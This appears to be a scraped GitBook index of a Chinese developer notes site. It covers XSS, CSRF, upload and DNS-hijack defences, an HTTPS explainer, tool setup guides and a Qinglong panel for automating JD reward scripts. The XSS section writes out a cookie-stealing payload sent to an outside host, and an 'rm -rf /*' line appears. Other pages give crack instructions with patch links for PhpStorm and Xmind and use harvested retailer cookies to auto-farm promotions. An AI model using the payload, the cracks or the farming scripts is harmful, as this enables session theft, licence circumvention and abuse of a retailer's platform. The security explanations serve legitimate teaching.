‘http://attach.com/x.js?c=’+document.cookie); document.body.appendChild(i); 提交后，当别人打开这个页面查看这个评论的时候，攻击的网站就获取到了这个人所有cookie信息(包括session id)，然后在通过脚本加载cookie后进行所有被攻击者所具有权限的操作。 xss个人攻击测试cookie管理平台 : https://github.com/keyus/xss XSS攻击的危害包括 1、盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号 2、控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力 3、盗窃企业重要的具有商业价值的资料 4、非法转账 5、强制发送电子邮件 6、网站挂马 7、控制受害者机器向其它网站发起攻击 原因解析 主要原因：过于信任客户端提交的数据！ 解决办法：不信任任何客户端提交的数据，只要是客户端提交的数据就应该先进行相应的过滤处理然后方可进行下一步的操作。 防范脚本注入和XSS攻击： 服务器只开放必要的端口：如80、443、22等 参数校验 页面提交的内容一定要做HTML Escape 转义 URL上提交的内容要做URL Encode 转义 登录注册入口做好人机识别（验证码等） 当今的互联网对xss的防范已经做得比较到位了，一般稍微像样点儿的框架都做了防护。只有测试一些古老的asp,或者一些程序员偷懒不做过滤的 4.CSRF(cross site request forgery)跨站请求伪造 CSRF原理 攻击者盗用了你的身份，以你的名义发送恶意请求。 以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账。 造成个人隐私泄露以及财产安全问题 可以理解为有一个小偷在你配钥匙的地方得到了你家的钥匙，然后拿着去你家想偷什么偷什么。 完成CSRF攻击必须有三种条件： 用户以及登陆了站点A，并在本地记录了cookie 用户在没有登出站点A的情况下（也就是cookie生效的情况下），访问了恶意攻击者提供的引诱危险站点B（B要求访问A）——（B也可能为一个存在其他漏洞的可信任网站） 站点A没有做任何CSRF防御 很多人对XSS和CSRF是傻傻分不清楚的。 首先常见的XSS攻击的对象是网站本身，通过注入网页的方式，获取用户信息。 而CSRF就非常聪明了，直接绕过了注入这一步，甚至黑客不需要获取用户的Cookie信息，直奔主题。 CSRF攻击方式早几年并不为大家所熟知，实际上很多网站都存在CSRF的安全漏洞。 早在2000年，CSRF这种攻击方式已经由国外的安全人员提出，但在国内，直到2006年才开始被关注。2008年，国内外多个大型社区和交互网站先后爆出CSRF漏洞，如：百度HI、NYTimes.com（纽约时报）、Metafilter（一个大型的BLOG网站）和YouTube等。但直到现在，互联网上的许多站点仍对此毫无防备，以至于安全业界称CSRF为“沉睡的巨人”，其威胁程度由此“美誉”便可见一斑。 那么，我们先来看一下CSRF的攻击原理吧： 如果图中的流程看的不是太明白，那么我们来看一个例子（摘抄自网络）： 受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求： http://bank.example/withdraw?account=bob&amount=1000000&for=bob2可以使 Bob 把 1000000 的存款转到 bob2 的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，并且该session 的用户 Bob 已经成功登陆。 黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。Mallory 可以自己发送一个请求给银行： http://bank.example/withdraw?account=bob&amount=1000000&for=Mallory但是这个请求来自 Mallory 而非 Bob，他不能通过安全认证，因此该请求不会起作用。这时，Mallory 想到使用 CSRF 的攻击方式，他先自己做一个网站，在网站中放入如下代码：src=”http://bank.example/withdraw?account=bob&amount=1000000&for=Mallory”，并且通过广告等诱使 Bob 来访问他的网站。当 Bob 访问该网站时，上述 url 就会从 Bob 的浏览器发向银行，而这个请求会附带 Bob 浏览器中的 cookie 一起发向银行服务器。 大多数情况下，该请求会失败，因为他要求 Bob 的认证信息。但是，如果 Bob 当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的cookie 之中含有 Bob 的认证信息。这时，悲剧发生了，这个 url 请求就会得到响应，钱将从 Bob 的账号转移到 Mallory 的账号，而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，没有任何被攻击的痕迹。而 Mallory 则可以拿到钱后逍遥法外。 防御CSRF攻击策略 验证HTTP Referer字段 正确使用GET 在请求地址中添加token并验证 在HTTP头中自定义属性并验证。 表单伪随机数 验证HTTPReferer字段 Referer 是HTTP协议定义的一个头字段，它记录了该HTTP请求的来源地址。通过Referer就可以简单的区分出这次请求是来自哪里，并做到基本的防范。 但Referer毕竟是由请求者发起的，如果你用的是IE6浏览器（鄙视下IE），依然是可以伪造的。 正确使用GET GET常用在查看，列举，展示等不需要改变资源属性的时候。因为GET方式参数是直接呈现在url中的，很方便，但也很不安全。所以不要以GET方式开放不安全的接口。 在请求地址中添加token并验证 在正确使用GET 的前提下，对于非GET请求，如POST，可以用在创建、修改、删除资源或者做其他一些相对敏感的事情。而且需要为每一个用户生成一个唯一的Token存放在Cookie或LocalStorage里面，并附带在Post请求中。但是由于XSS可以轻易的获取用户的Cookie或Local Storage，这种方式也不是十分的安全。 在HTTP头中自定义属性并验证 这种方法也是使用 token 并进行验证，和上一种方法不同的是，这里并不是把 token 以参数的形式置于 HTTP 请求之中，而是把它放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 这个类，可以一次性给所有该类请求加上csrftoken这个 HTTP 头属性，并把 token 值放入其中。而且，通过 XMLHttpRequest 请求的地址不会被记录到浏览器的地址栏，也不用担心token 会透过 Referer 泄露到其他网站中去。 表单伪随机数 不同的表单包含一个不同的伪随机值。这种做法，其实在一些知名的开源WEB框架里面早就有了，如：PHP的Drupal，Python的Flask，只是国人安全意思太薄弱，太后知后觉了。伪随机数的原理也很简单： 当页面表单生成的时候由后端服务生成伪随机数放置在表单的隐藏域里面，并在后端缓存伪随机数。 表单提交的时候后端服务器验证伪随机数的正确性和时效性，删除缓存的伪随机数。 这样做不仅可以避免CSRF攻击，同时可以避免表单的重复提交。 5.文件上传漏洞 介绍：倘若web网站没有对文件类型进行严格的校验，导致可执行文件上传到了服务器，恶意程序就会执行。 防御：客户端检测 ：程序员一般使用 JavaScript 来拒绝非法文件上传。 执行文件 当成pngjpg 服务器端检测： 1）白名单与黑名单验证：定义不允许或允许上传的文件扩展名； 2）MIME验证：php 中通过 $_FILE['file']['type'] 来检验； 3）目录验证：在文件上传时，程序通常允许用户将文件放到指定的目录中，如果指定的目录存在，就将文件写入目录中。 SSH暴力破解 1.修改ssh默认登录端口22和mysql默认端口3306为其他不常用端口，如34392等； 2.编写脚本监测/var/log/secure文件（该文件是linux系统的登录日志），如果有登录失败的IP，则将该IP添加至/etc/hosts.deny文件（该文件是tcpd服务器的配置文件，tcpd服务器可以控制外部IP对本机服务的访问。tcpd的配置文件有两个：hosts.allow和hosts.deny，通过它们可以允许或者拒绝某个ip或者ip段的客户访问linux的某项服务。具体可参考：http://purpen.iteye.com/blog/1135342） 手动封禁ip /etc/hosts.deny sshd: 113.92.153.163 /etc/init.d/denyhosts restart 3.禁止用户使用密码登录，使用密钥登录 软件漏洞攻击 系统级别漏洞 常用的CMS出现的漏洞，Diszcus phpcms Thinkphp wordpress 密切注意第三方代码，及时打补丁。 乌云 http://www.anquan.us/ 域名劫持、DNS劫持 域名劫持 页面的右下角被插入了广告。 流量劫持总体来说属于中间人攻击（Man-in-the-Middle Attack，MITM）的一种，本质上攻击者在通信两端之间对通信内容进行嗅探和篡改，以达到插入数据和获取关键信息的目的。 使用HTTPS防止流量劫持 DNS劫持 DNS这个环节可以被太多因素影响，所以不少利益相关者都会在这里面做手脚。例如，DNS劫持就是非常常见的广告投放手段，你打开百度或者输入你正确的目标域名网址，整个网页却被强制跳转到XX娱乐城，这就是典型的DNS劫持。 DNS劫持解决办法？怎么防止DNS劫持？ https只能解决http流量劫持，对于dns劫持 https无效 经过测试发现域名是直接被劫持 解析到劫持的服务器ip去,向运营商、工信部投诉。 手动修改DNS服务器地址： XP：网上邻居---->网络连接--->本地连接---->属性 windows7: 网络和共享中心---->本地连接---->属性 首选DNS服务器（P）空格处分别填上114.114.114.114 备用DNS服务器（A）空格处分别填上8.8.4.4 1. 电信：114.114.114.114 2. 百度： 180.76.76.76 3. 阿里巴巴： 223.5.5.5 223.6.6.6 人为操作失误 制定严格操作流程，防止出现操作失误 rm -rf /* web开发工程师要求 登录、注册接口 短信接口 5-10万 50% 5万 0.03 身份证认证接口 3分 0.28 必须要有安全验证 验证码+鉴权 大型活动之前，提前cdn预热，redis缓存 热点数据加缓存 apk下载连接地址，有鉴权 其他 0day漏洞是什么？ 0day漏洞，又称“零日漏洞”(zero-day)，是已经被发现(有可能未被公开)，而官方还没有相关补丁的漏洞。通俗地讲就是，除了漏洞发现者，没有其他的人知道这个漏洞的存在，并且可以有效地加以利用，发起的攻击往往具有很大的突发性与破坏性。 秒换挂机宝与动态IP 原理是网络运营商公网的IP分配方式，比如Modem、ISDN、ADSL、有线宽频、小区宽频之类的宽带业务就是动态的，由你拔号上去后，服务器临时分配你一个IP地址用于上网，断线后这个IP地址就收回了，下次再上去，又会由服务器临时分配一个IP地址给你，这就是动态IP。 所谓的秒换在于产商的硬件与优化程度通过服务器进程线路实现秒换ip 效果，打开某一个程序或浏览器 实现单窗口单ip，在于承包运营商的优化技术，专业技术上实现秒换。如果有的地区VPS没有办法秒换是在于承包商的技术问题，比较好的秒换有 等拨号VPS。 由于其主机对外开放了诸如WWW 、FTP 、E-mail等访问服务，通常要对外公布一个固定的IP地址，以方便用户访问。当然，数字IP不便记忆和识别，人们更习惯于通过域名来访问主机，而域名实际上仍然需要被域名服务器(DNS )翻译为IP地址！所以为了IP资源不浪费全世界一共有43亿个IP按人分配资源就很少了，所以运营商就形成了两种模式公网IP和私有IP，公网IP可以与网络公司共享运营，增加运营商的额外利润。有需求就有市场，秒换最好找一些有试用的厂家可以对比选择！ web安全知识点（常见web攻击总结） https://blog.csdn.net/yin_fei_lnmp/article/details/106524645 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/safe/why-ssl-safe.html":{"url":"doc/safe/why-ssl-safe.html","title":"为什么说HTTPS是安全的","keywords":"","body":"为什么说HTTPS是安全的 1. HTTP 协议 在谈论 HTTPS 协议之前，先来回顾一下 HTTP 协议的概念。 1.1 HTTP 协议介绍 HTTP 协议是一种基于文本的传输协议，它位于 OSI 网络模型中的应用层。 HTTP 协议是通过客户端和服务器的请求应答来进行通讯，目前协议由之前的 RFC 2616 拆分成立六个单独的协议说明（RFC 7230、RFC 7231、RFC 7232、RFC 7233、RFC 7234、RFC 7235），通讯报文如下： 请求 POST http://www.baidu.com HTTP/1.1 Host: www.baidu.com Connection: keep-alive Content-Length: 7 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36 wd=HTTP 响应 HTTP/1.1 200 OK Connection: Keep-Alive Content-Encoding: gzip Content-Type: text/html;charset=utf-8 Date: Thu, 14 Feb 2019 07:23:49 GMT Transfer-Encoding: chunked ... 1.2 HTTP 中间人攻击 HTTP 协议使用起来确实非常的方便，但是它存在一个致命的缺点：不安全。 我们知道 HTTP 协议中的报文都是以明文的方式进行传输，不做任何加密，这样会导致什么问题呢？下面来举个例子： 小明在 JAVA 贴吧发帖，内容为我爱JAVA： 被中间人进行攻击，内容修改为我爱PHP 小明被群嘲(手动狗头) 可以看到在 HTTP 传输过程中，中间人能看到并且修改 HTTP 通讯中所有的请求和响应内容，所以使用 HTTP 是非常的不安全的。 1.3 防止中间人攻击 这个时候可能就有人想到了，既然内容是明文那我使用对称加密的方式将报文加密这样中间人不就看不到明文了吗，于是如下改造： 双方约定加密方式 使用 AES 加密报文 这样看似中间人获取不到明文信息了，但其实在通讯过程中还是会以明文的方式暴露加密方式和秘钥，如果第一次通信被拦截到了，那么秘钥就会泄露给中间人，中间人仍然可以解密后续的通信： 那么对于这种情况，我们肯定就会考虑能不能将秘钥进行加密不让中间人看到呢？答案是有的，采用非对称加密，我们可以通过 RSA 算法来实现。 在约定加密方式的时候由服务器生成一对公私钥，服务器将公钥返回给客户端，客户端本地生成一串秘钥(AES_KEY)用于对称加密，并通过服务器发送的公钥进行加密得到(AES_KEY_SECRET)，之后返回给服务端，服务端通过私钥将客户端发送的AES_KEY_SECRET进行解密得到AEK_KEY,最后客户端和服务器通过AEK_KEY进行报文的加密通讯，改造如下： 可以看到这种情况下中间人是窃取不到用于AES加密的秘钥，所以对于后续的通讯是肯定无法进行解密了，那么这样做就是绝对安全了吗？ 所谓道高一尺魔高一丈，中间人为了对应这种加密方法又想出了一个新的破解方案，既然拿不到AES_KEY，那我就把自己模拟成一个客户端和服务器端的结合体，在用户->中间人的过程中中间人模拟服务器的行为，这样可以拿到用户请求的明文，在中间人->服务器的过程中中间人模拟客户端行为，这样可以拿到服务器响应的明文，以此来进行中间人攻击： 这一次通信再次被中间人截获，中间人自己也伪造了一对公私钥，并将公钥发送给用户以此来窃取客户端生成的AES_KEY，在拿到AES_KEY之后就能轻松的进行解密了。 中间人这样为所欲为，就没有办法制裁下吗，当然有啊，接下来我们看看 HTTPS 是怎么解决通讯安全问题的。 2. HTTPS 协议 2.1 HTTPS 简介 HTTPS 其实是SSL+HTTP的简称,当然现在SSL基本已经被TLS取代了，不过接下来我们还是统一以SSL作为简称，SSL协议其实不止是应用在HTTP协议上，还在应用在各种应用层协议上，例如：FTP、WebSocket。 其实SSL协议大致就和上一节非对称加密的性质一样，握手的过程中主要也是为了交换秘钥，然后再通讯过程中使用对称加密进行通讯，大概流程如下： 这里我只是画了个示意图，其实真正的 SSL 握手会比这个复杂的多，但是性质还是差不多，而且我们这里需要关注的重点在于 HTTPS 是如何防止中间人攻击的。 通过上图可以观察到，服务器是通过 SSL 证书来传递公钥，客户端会对 SSL 证书进行验证，其中证书认证体系就是确保SSL安全的关键，接下来我们就来讲解下CA 认证体系，看看它是如何防止中间人攻击的。 2.2 CA 认证体系 上一节我们看到客户端需要对服务器返回的 SSL 证书进行校验，那么客户端是如何校验服务器 SSL 证书的安全性呢。 权威认证机构 在 CA 认证体系中，所有的证书都是由权威机构来颁发，而权威机构的 CA 证书都是已经在操作系统中内置的，我们把这些证书称之为CA根证书： 签发证书 我们的应用服务器如果想要使用 SSL 的话，需要通过权威认证机构来签发CA证书，我们将服务器生成的公钥和站点相关信息发送给CA签发机构，再由CA签发机构通过服务器发送的相关信息用CA签发机构进行加签，由此得到我们应用服务器的证书，证书会对应的生成证书内容的签名，并将该签名使用CA签发机构的私钥进行加密得到证书指纹，并且与上级证书生成关系链。 这里我们把百度的证书下载下来看看： 可以看到百度是受信于GlobalSign G2，同样的GlobalSign G2是受信于GlobalSign R1，当客户端(浏览器)做证书校验时，会一级一级的向上做检查，直到最后的根证书，如果没有问题说明服务器证书是可以被信任的。 如何验证服务器证书 那么客户端(浏览器)又是如何对服务器证书做校验的呢，首先会通过层级关系找到上级证书，通过上级证书里的公钥来对服务器的证书指纹进行解密得到签名(sign1)，再通过签名算法算出服务器证书的签名(sign2)，通过对比sign1和sign2，如果相等就说明证书是没有被篡改也不是伪造的。 这里有趣的是，证书校验用的 RSA 是通过私钥加密证书签名，公钥解密来巧妙的验证证书有效性。 这样通过证书的认证体系，我们就可以避免了中间人窃取AES_KEY从而发起拦截和修改 HTTP 通讯的报文。 总结 首先先通过对 HTTP 中间人攻击的来了解到 HTTP 为什么是不安全的，然后再从安全攻防的技术演变一直到 HTTPS 的原理概括，希望能让大家对 HTTPS 有个更深刻的了解。 原文来自：https://segmentfault.com/a/1190000023936425 作者：mokeyWie Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-05-07 10:25:51 "},"doc/software/":{"url":"doc/software/","title":"开发常用","keywords":"","body":"常用软件 常用软件简介 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/software/Typora_PicGo_Gitee_markdown_pic.html":{"url":"doc/software/Typora_PicGo_Gitee_markdown_pic.html","title":"Typora+PicGo+Gitee或github实现markdown自带图床效果","keywords":"","body":"Typora+PicGo+Gitee或github实现markdown自带图床效果 这里可以选择gitee或者码云，gitee由于众所周知的原因有时候会很慢，无奈选择gitee 一、下载安装 PicGo软件 下载并且安装PicGo PicGo官网. github下载应用：https://github.com/Molunerfinn/PicGo/releases 建议下载PicGo-Setup-2.2.2稳定版的PicGo，我这边下载3.0版本，出现一些bug。 安装完成之后，进入软件安装gitee插件（注：若没有安装 node.js ，则会安装不了插件。因为插件下载需要使用到 node.js 的npm！） 安装 node.js 如果你已经有阿里云、腾讯云、七牛云等图床，可以直接跳过后面步骤，在PicGo 软件上配置 node.js 官网链接：https://nodejs.org/zh-cn/ 选个自己喜欢的版本下载，node.js 的配置可自行百度，这里就不详写了 支持以下图床 腾讯云COS 微博图床 停止支持 GitHub图床 七牛图床 imgur图床 国外图床被墙，不建议使用 阿里云OSS 有拍云图床 二、安装Typora软件（markdown编辑软件） 官方网站：https://typora.io/ 配置Typora上传设定:文件--->偏好设置--> 图像 --> 上传服务设定 三、使用Gitee码云创建图床 1.1 在Gitee中创建一个仓库 注意仓库要是public的，不然上传的图片还是无法使用的。 https://gitee.com/funet8/blogimage.git 1.2 在Gitee生成一个token 这个token是给 PicGo 使用的 如果安装没有反应请安装node.js，否则插件可能一直在安装中，那就非常蛋疼了。 四、创建github图床 优点：免费、方便 缺点：国内访问慢 新建github仓库并且新建token 设置--> settings--->developer settings---> 勾选repo 页面拉到最下有一个绿色的Generate token按钮，按一下就会生成token。 将生成的token复制下来，给PicGo使用。 注意：生成的token最好保存到本地，因为下次再进GitHub的时候，这个token就不再显示了。 配置PicGo的github图床 仓库名的格式是GitHub用户名\\仓库名，前面不用加什么http，后面也不用加.git。分支名就用默认的主分支master。token上一步在github里生成的token。指定存储路径指的是在GitHub仓库里面的路径，我写了picgo/，所以我的仓库下面会生成一个picgo目录，所有图片都会上传到这个img目录下。指定存储路径不是必填项，可以不写。 https://github.com/funet8/blogimage.git 设定仓库名：funet8/blogimage 分支名：master 设定token：xxxxx 指定存储路径：随意 我这里填写 picgo/ 提示上传成功 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-28 16:01:07 "},"doc/software/Typora_PicGo_aliyun_oss.html":{"url":"doc/software/Typora_PicGo_aliyun_oss.html","title":"程序员必备-Typora+PicGo+阿里云oss实现图床","keywords":"","body":"程序员必备-Typora+PicGo+阿里云oss实现图床 按照上篇文章《程序员必备-Typora+PicGo+码云或github实现免费markdown自带图床》部署了，之后有时候会担心gitee或者github不提供服务， 必备：阿里云账号，会有一些费用，具体看官方。 域名是非必须，但是我这边有个域名，可以设置一个自定义的域名： imgoss.xgss.net 一.阿里云OSS配置 1.创建Bucket（桶） 进入OSS控制台，右上角选择创建Bucket Bucket名称 （配置PicGo需要用到） Endpoint的地址（配置PicGo需要用到） 选择公共读 存储类型和空间啥的，按需求购买设置 2.获取密钥 右上角，访问控制 左边操作栏，选择 人员管理——用户 去新建用户。找个记事本，记下来，AccessKey ID 和 AccessKeySecret，之后配置PicGo需要用到 3.分配权限 对这个用户进行权限管理，选择 AliyunOSSFullAccess——管理对象存储服务（OSS）权限 2.配置域名绑定到阿里云OSS中 回到阿里云OSS配置中，“传输管理”--->域名管理 imgoss.xgss.net cname解析到 imgoss.xgss.net 域名CNAME解析到外网访问 imgoss-xgss-net.oss-cn-shenzhen.aliyuncs.com 测试，上传1个文件到oss http://imgoss.xgss.net/test.html http://imgoss.xgss.net/picgo/1.png 二、PicGo设置阿里云OSS KeyId 就是上面记在小本本上的，AccessKey ID Secret 就是 AccessKeySecret 存储空间名字 就是 Bucket的名字 确认存储区域，就是上面的 Endpoint的地址 ，比如你的是，oss-cn-beijing.aliyuncs.com 那么这里就是 `oss-cn-beijing，去掉阿里云的后缀 指定存储路径，随意咯，最好是有个路径区分。比如，picgo/，这样子可以去阿里云OSS上面看到对应的文件夹，比较好整理 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-28 16:01:22 "},"doc/software/Typora_PicGo_failedto_Fetch.html":{"url":"doc/software/Typora_PicGo_failedto_Fetch.html","title":"PicGo failed to Fetch 出错解决方案","keywords":"","body":"PicGo failed to Fetch 出错解决方案 再次报错： 将 C:\\Users\\star\\AppData\\Roaming\\PicGo中的 windows10.ps1 文件重命名 windows.ps1 上传成功 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-28 16:00:28 "},"doc/software/Install-PhpStorm.html":{"url":"doc/software/Install-PhpStorm.html","title":"安装PhpStorm、破解、汉化","keywords":"","body":"一、安装PhpStorm 官网下载并且安装： https://www.jetbrains.com/zh-cn/phpstorm/ 安装省略了 二、破解方案 1、下载2021年phpstorm最新破解补丁 蓝奏云下载直链：https://lanzoui.com/iJKPvnknmle 密码:c9hh 链接：https://pan.baidu.com/s/1HtiC38cVqPQrUHTxjnSf6w 提取码：457n 2、破解激活phpstorm2020.3.1 虽然版本名称仍然是2020但其实这已经是2021年发布的了，后续肯定还会更新的，但截至到2021年1月，此款就是phpstorm最新版本了。 我们在官网下载好之后直接安装就行了，安装好之后，下面我们来看应该怎么破解，补丁在上面，记得下载。 新版本打开之后是这样的，我们先随便新建一个项目，我们只是为了进入到项目页面，进入之后，我们点击上面的help菜单找到about，我们会看到自己软件的过期信息（刚安装phpstorm有一个月的试用期）： 随后，我们直接找到下载的破解补丁JetbrainsPatch_20210101.zip这个压缩包，然后将其拖入项目右侧的空白区域，之后关闭phpstorm，重新打开。 还没完呢，接着往下看，找到菜单栏的help，点击Register，在新出来的页面点击Add New License，最后在下图所示的位置填写激活码（激活码和下载的补丁在一块哦）。 最后点击Activate就可以了。 到这，2021最新的phpstorm2020.3.1版本就破解成功了，激活时间和第一张图一样到2099年。 三、phpstorm官方汉化教程 phpstorm老版本汉化需单独下载第三方汉化包，给使用者带来诸多不变，新版本可直接从设置里搜索官方汉化包，在开发模式下安装即可完成。 PHP工具phpstorm界面汉化教程： 1、下载注册激活后打开工具File文件项，选择项下Setting选项 2、进入设置页面，收索栏查询chinese选择右侧Chinese(Simplified)汉化插件，点击下载(Install)确认后自动重新启动界面 3、重启后界面后，所有界面就显示了中文界面，至此phpstorm汉化完成 注意：phpstorm官方汉化插件仅支持最新版本，即2020.1版本，老版本需要升级后才能支持！ Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/software/Xmind2021安装激活破解.html":{"url":"doc/software/Xmind2021安装激活破解.html","title":"Xmind2021安装激活破解","keywords":"","body":"Xmind2021安装激活破解 1.下载Xmind，并安装。 官网: https://www.xmind.cn/download/ 激活破解 2.1右击软件，打开文件所在的位置（默认路径:C:\\Program Files\\XMind） 2.2将app.asar文件复制到resources路径下，替换目标中的文件 链接：https://pan.baidu.com/s/1xMOOdjPtzYputcGh7cd9sA 提取码：lyz0 https://www.cnblogs.com/liyuanzhouye/p/15630305.html Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/software/Windows下VSCode及中文配置.html":{"url":"doc/software/Windows下VSCode及中文配置.html","title":"Windows下VSCode及中文配置","keywords":"","body":"Windows下VSCode及中文配置 一.什么是vscode Visual Studio Code (简称 VS Code / VSC) 是一款免费开源的现代化轻量级代码编辑器，支持几乎所有主流的开发语言的语法高亮、智能代码补全、自定义热键、括号匹配、代码片段、代码对比 Diff、GIT 等特性，支持插件扩展，并针对网页开发和云端应用开发做了优化。软件跨平台支持 Win、Mac 以及 Linux。 vscode 官网： https://code.visualstudio.com/ 二.下载和安装 1.首先在官网下载vscode软件 https://code.visualstudio.com/download 2.选择vscode版本（根据自己的操作系统选择相应的版本） 版本说明： User Installer版：会安装在当前计算机帐户目录,意味着如果使用另一个帐号登陆计算机将无法使用别人安装的vscode。 System Installer版：安装在非用户目录,例如C盘根目录,任何帐户都可以使用。(建议使用此版本) vscode默认提供的User Installer版,大多数人都是用的这个版本。 3.当出现如下界面表示安装包正在下载 4.双击刚才下载的安装包程序 5.同意协议，点击下一步 6.选择安装目录，若无需修改默认即可，点击下一步 7.环境变量，勾选这几项，点击下一步 8.安装成功（到此步骤已经安装成功了） 三、汉化 因为刚安装的VSCode默认是英文的，这里需要给设置成中文 1.在桌面找到刚刚安装的VSCode，双击打开 2.进入插件库，并安装汉化插件（搜索Chinese） 3.安装完成后点击右下角弹出的重启编辑器提示 4.汉化完成 vscode 配置插件 PicGo 先来看看什么是 PicGo https://picgo.github.io/PicGo-Doc/zh/guide/ PicGo在上传图片之后自动会将图片链接复制到你的剪贴板里，可选5种复制的链接格式。 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/internet/":{"url":"doc/internet/","title":"互联网","keywords":"","body":"互联网 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/internet/programmer_position_skills.html":{"url":"doc/internet/programmer_position_skills.html","title":"互联网程序员各个职位技能图-多图警告","keywords":"","body":"互联网程序员各个职位技能图-多图警告 程序开发语言综述 DBA技能图谱 HADOOP家族技能图谱 HTML5开发技能图谱 IOS开发工程师技能图谱 JAVA技能图谱 JAVA学习 OpenResty技能图谱 PHP正则表达式 WEB测试避雷指南 安全工程师必备技能 大数据必备技能 机器学习技能图谱 架构师技能图谱 嵌入式开发必备技能 云计算必备技能 运维工程师必备技能 运维工程师技能 运维知识体系 移动性能优化技能图谱 前端工程师必备技能 前端工程师 前端知识体系图 缓存知识体系 常见服务器集群 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-28 15:53:54 "},"doc/internet/qinglong_jingdongdou.html":{"url":"doc/internet/qinglong_jingdongdou.html","title":"青龙面板每天自动获取某东豆","keywords":"","body":"Docker安装青龙面板每天自动获取某东豆 首先说一下获取jing东豆（以下简称豆子）的几种方式，也是基本打卡等软件的方式 一、手动获取豆子 最简单、原始的方法 二、路由器签到领豆子 此方法适用于路由器刷机openwrt系统之后，安装jing东签到插件，每天定时签到。 插件能运行一个脚本，一般都是这个多合一签到的脚本，签到内容及目录众多，比手动签到省时省力。 三、更高级的面板管理脚本 可以安装青龙面板、elecV2P、面板签到等软件。 优点：活动众多，获取jing豆较多。可以按照自己的方式设定，完全满足私人定制。 缺点：安装面板前需要有服务器安装docker，或者能安装docker都可以。再安装面板，之后还需要拉取jing东签到的各种脚本，对脚本做稍微修改。过程较为繁琐，没有一键搞定的功能。 系统说明 青龙面板可以做什么？ 1.自动做活动，比如东东工厂、农场、京喜工厂、京喜农场，jing东到家农场等等，可以免费领一些东西，挺实惠的 2.会自动领jing东，现在的话一般是一天一二百，不算开卡，要是新号没有开过卡，可以一次领好几千。 3.自动做各种限时任务，领红包，免得自己做 搭建需要Linux系统的服务器，我用的是CentOS 7.9，内网IP： 192.168.1.9 当然可以使用Windows系统或者 虚拟机或者nas，只要能安装docker 先上手机截图 安装青龙面板 大致步骤 1.电脑安装VMware虚拟机ceonts7系统或者购买云服务器 ceontos7 2.安装docker软件 3.启动镜像青龙实例 4.登录青龙后台，查看实际密码 5.利用chrome获取jing东的cookie，填写cookie到环境变量中 6.新建任务 7.验证是否成功。 1.使用ssh工具连接服务器 略 2.安装docker 略 3.拉取并且运行青龙面板镜像 # docker run -dit \\ --name QingLong \\ --hostname QingLong \\ --restart always \\ -p 5700:5700 \\ -v /data/docker/QingLong/config:/ql/config \\ -v /data/docker/QingLong/log:/ql/log \\ -v /data/docker/QingLong/db:/ql/db \\ -v /data/docker/QingLong/scripts:/ql/scripts \\ -v /data/docker/QingLong/jbot:/ql/jbot \\ whyour/qinglong:latest http://192.168.1.5:5700/login 用户名为 admin 密码是 adminadmin 重置密码 登录成功后，在/data/docker/QingLong/config 中找到auth.json # cat /data/docker/QingLong/config/auth.json {\"username\":\"admin\",\"password\":\"9zpGGqsUqmRI-XXXXXX\",\"retries\":1,\"lastlogon\":1632708794695,\"lastip\":\" 113.90.39.224\",\"lastaddr\":\" 广东省深圳市 | 电信\",\"platform\":\"desktop\"} 登录 使用青龙面板 一、添加库：进入面板-右上角“定时任务”-分别填入相关信息。提供个人设置，给大家参考。其中人物名、任务定时可自定义。 二、运行库任务添加脚本：分别点击每个库的运行按钮，稍等一下。然后刷新页面，就能看到库的脚本了。 说明 更新一个整库脚本 ql repo 更新单个脚本文件 ql raw 示例 【Faker集合仓库】 ql repo https://ghproxy.com/https://github.com/shufflewzc/faker2.git \"jd_|jx_|jddj_|getJDCookie\" \"activity|backUp\" \"^jd[^_]|USER|ZooFaker_Necklace|JDJRValidator_Pure\" 9 1-23/4 * * * 柠檬（胖虎）代维护lxk0301仓库 ql repo https://github.com/panghu999/jd_scripts.git \"jd_|jx_|getJDCookie\" \"activity|backUp|Coupon|jd_try|format_\" \"^jd[^_]|USER\" 12 1-23/4 * * * 柠檬（胖虎）仓库 ql repo https://github.com/panghu999/panghu.git \"jd_\" 4 1-23/4 * * * 青蛙蛤蟆 ql repo https://github.com/smiek2221/scripts.git \"jd_\" \"\" \"JDJRValidator_Pure.js|sign_graphics_validate.js\" 龙珠仓库 ql repo https://github.com/longzhuzhu/nianyu.git \"qx\" “main” 1 1-23/4 * * * moposmall仓库 ql repo https://github.com/moposmall/Script.git \"jx_mc|cfd.js\" 2 1-23/4 * * * 混沌仓库 ql repo https://github.com/whyour/hundun.git \"quanx\" \"tokens|caiyun|didi|donate|fold|Env|.py\" 3 1-23/4 * * * Ariszy（Zhiyi-N）仓库 ql repo https://github.com/Ariszy/Private-Script.git \"JD\" 5 1-23/4 * * * jiulan仓库 ql repo https://github.com/jiulan/platypus.git 6 1-23/4 * * * JDHelloWorld仓库 ql repo https://github.com/JDHelloWorld/jd_scripts.git \"jd_|jx_|getJDCookie\" \"activity|backUp|Coupon|enen|update\" \"^jd[^_]|USER\" 7 1-23/4 * * * passerby-b 仓库 ql repo 